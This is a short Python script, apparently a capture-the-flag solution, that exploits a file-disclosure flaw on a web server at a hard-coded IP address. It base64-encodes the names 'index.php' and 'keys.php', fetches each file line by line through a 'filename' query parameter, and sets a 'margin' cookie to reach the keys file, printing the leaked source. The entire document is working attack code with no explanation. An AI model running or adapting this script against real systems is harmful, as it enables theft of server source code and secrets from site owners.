import base64
import requests

index_b64 = base64.b64encode('index.php'.encode()).decode()
target = 'http://120.24.86.145:8002/web11/index.php?line={}&filename={}'
session = requests.Session()

for i in range(30):
    r = session.get(target.format(i, index_b64))
    print(i, '\t', r.content.decode(), end='')

session.cookies['margin'] = 'margin'

keys_b64 = base64.b64encode('keys.php'.encode()).decode()

for i in range(30):
    r = session.get(target.format(i, keys_b64))
    print(i, '\t', r.content.decode())
